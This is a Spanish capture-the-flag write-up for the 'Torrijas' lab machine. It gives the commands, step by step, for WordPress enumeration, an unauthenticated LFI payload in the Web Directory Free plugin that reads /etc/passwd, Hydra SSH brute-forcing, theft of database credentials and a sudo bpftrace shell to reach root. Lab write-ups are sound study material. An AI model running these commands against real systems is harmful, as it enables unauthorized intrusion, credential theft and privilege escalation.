---
tags:
  - Cybersecurity
  - Labs
  - TheHackersLabs
  - Easy
  - HTTP
  - FuzzingWeb
  - CMS
  - WordPress
  - LFI
  - Hydra
  - SSH
  - SecurityMisconfigurations
  - MySQL
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Arp-scan|Arp-scan]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
	- [[#Enumeración#WordPress|WordPress]]
- [[#Explotación|Explotación]]
	- [[#Explotación#LFI — Web Directory Free|LFI — Web Directory Free]]
	- [[#Explotación#Hydra|Hydra]]
	- [[#Explotación#SSH|SSH]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Security Misconfigurations|Security Misconfigurations]]
	- [[#Escalada de Privilegios#MySQL|MySQL]]
	- [[#Escalada de Privilegios#Sudo|Sudo]]

---
# Torrijas

![](Screenshots/torrijas.png)

> En este write-up se documenta la resolución paso a paso de la máquina **Torrijas** de [The Hackers Labs](https://labs.thehackerslabs.com/machine/92), clasificada como dificultad **Easy**. Durante la explotación se abusa de una vulnerabilidad **LFI en WordPress**, se reutilizan credenciales y se aprovechan malas configuraciones para escalar privilegios hasta **root**.

---
## Enumeración
### Arp-scan

Se descubre la IP de la máquina victima.

`arp-scan -I [NETWORK_INTERFACE] --localnet`

![](Screenshots/Pasted%20image%2020251223110611.png)
### Ping

`ping -c 1 192.168.1.37`

![](Screenshots/Pasted%20image%2020251223110757.png)
### Nmap

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 192.168.1.37 -oG allPorts`

![](Screenshots/Pasted%20image%2020251223110940.png)

`nmap -p22,80,3306 -sCV 192.168.1.37 -oN targeted`

![](Screenshots/Pasted%20image%2020251223111001.png)
### HTTP

`http://192.168.1.37/`

![](Screenshots/Pasted%20image%2020251223111123.png)
#### Fuzzing Web

`gobuster dir -u http://192.168.1.37 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 64`

![](Screenshots/Pasted%20image%2020251223111519.png)

Se encuentra un directorio: `/wordpress`.

`http://192.168.1.37/wordpress/`

![](Screenshots/Pasted%20image%2020251223111620.png)
### WordPress

`wpscan --url http://192.168.1.37/wordpress/ --enumerate u`

![](Screenshots/Pasted%20image%2020251223112319.png)

Se encuentra el usuario: `administrator`.

Se procede a realizar fuerza bruta.

`wpscan --url http://192.168.1.37/wordpress/ -U administrator -P /usr/share/wordlists/rockyou.txt`

Pero no se encuentra la contraseña.

Se realiza un enumeración de los *plugins*.

`wpscan --url http://192.168.1.37/wordpress/ --enumerate ap --force --plugins-detection mixed`

![](Screenshots/Pasted%20image%2020251223115104.png)

Una de los *plugins*: `web-directory-free`, tiene una vulnerabilidad `LFI`.

---
## Explotación
### LFI — Web Directory Free

[Web Directory Free < 1.7.3 - Unauthenticated LFI](https://wpscan.com/vulnerability/0e8930cb-e176-4406-a43f-a6032471debf/).

`curl -X POST http://192.168.1.37/wordpress/wp-admin/admin-ajax.php -d "from_set_ajax=1&action=w2dc_controller_request&template=../../../../../etc/passwd"`

![](Screenshots/Pasted%20image%2020251223115354.png)

Se encuentran los siguientes usuarios:
- `primo`.
- `premo`.
### Hydra

Se realizar fuerza bruta con **Hydra** a los usuarios.

`hydra -l primo -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.37 -t 64`

No se encuentra la contraseña.

`hydra -l premo -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.37 -t 64`

![](Screenshots/Pasted%20image%2020251223115822.png)
### SSH

`ssh premo@192.168.1.37`

![](Screenshots/Pasted%20image%2020251223120112.png)

`ls -l`

![](Screenshots/Pasted%20image%2020251223120205.png)

Se encuentra la *flag* del usuario.

---
## Escalada de Privilegios
### Security Misconfigurations

`find / -name wp-config.php 2>/dev/null`

![](Screenshots/Pasted%20image%2020251223121134.png)

`cat /var/www/html/wordpress/wp-config.php`

![](Screenshots/Pasted%20image%2020251223121229.png)
### MySQL

Nos conectamos a la **BBDD** con el usuario: `admin`.

`mysql -u admin -p`

`show databases;`

![](Screenshots/Pasted%20image%2020251223121807.png)

```
use wordpress;
show tables;
```

![](Screenshots/Pasted%20image%2020251223121838.png)

`SELECT * FROM wp_users;`

![](Screenshots/Pasted%20image%2020251223121903.png)

Nos conectamos a la **BBDD** con el usuario: `admin`.

`mysql -u root -p`

`show databases;`

![](Screenshots/Pasted%20image%2020251223122333.png)

```
use Torrijas;
show tables;
```

![](Screenshots/Pasted%20image%2020251223122344.png)

`SELECT * FROM primo;`

![](Screenshots/Pasted%20image%2020251223122358.png)

Con la contraseña del usuario `primo`, se pivota en **SSH**.

`su primo`
### Sudo

`sudo -l`

![](Screenshots/Pasted%20image%2020251223122611.png)

[GTFOBins - bpftrace](https://gtfobins.github.io/gtfobins/bpftrace/).

`sudo bpftrace -c /bin/sh -e 'END {exit()}'`

![](Screenshots/Pasted%20image%2020251223122736.png)

Se encuentra la *flag* de **root** en la ruta: `/root`.

---